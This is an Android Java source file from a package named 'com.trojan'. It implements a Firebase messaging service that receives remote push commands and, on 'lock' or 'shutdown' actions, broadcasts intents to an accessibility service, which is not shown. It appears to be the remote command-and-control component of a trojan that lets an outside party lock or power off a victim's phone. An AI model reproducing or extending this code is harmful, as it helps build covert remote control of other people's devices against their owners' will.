package com.trojan;

import android.content.Intent;
import android.util.Log;
import androidx.annotation.NonNull;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

import java.util.Map;

public class MyFirebaseMessagingService extends FirebaseMessagingService {

    private static final String TAG = "MyFirebaseMsgService";

    @Override
    public void onMessageReceived(@NonNull RemoteMessage remoteMessage) {
        super.onMessageReceived(remoteMessage);

        Log.d(TAG, "FCM Message From: " + remoteMessage.getFrom());

        // Check if the message contains a data payload.
        if (remoteMessage.getData().size() > 0) {
            Map<String, String> data = remoteMessage.getData();
            Log.d(TAG, "Message data payload: " + data);

            // Look for an 'action' key in the data payload
            String action = data.get("action");
            if (action == null) {
                Log.w(TAG, "No 'action' key found in FCM message data.");
                return;
            }

            // Create an intent based on the action and broadcast it
            Intent intent = null;
            if ("lock".equalsIgnoreCase(action)) {
                intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_LOCK_SCREEN);
            } else if ("shutdown".equalsIgnoreCase(action)) {
                intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_SHUTDOWN);
            }

            if (intent != null) {
                Log.d(TAG, "Broadcasting action: " + intent.getAction());
                sendBroadcast(intent);
            } else {
                Log.w(TAG, "Received unknown action: " + action);
            }
        }
    }

    @Override
    public void onNewToken(@NonNull String token) {
        super.onNewToken(token);
        Log.d(TAG, "Refreshed FCM token: " + token);
        // You can send this token to your server if you need to target specific devices
    }
}
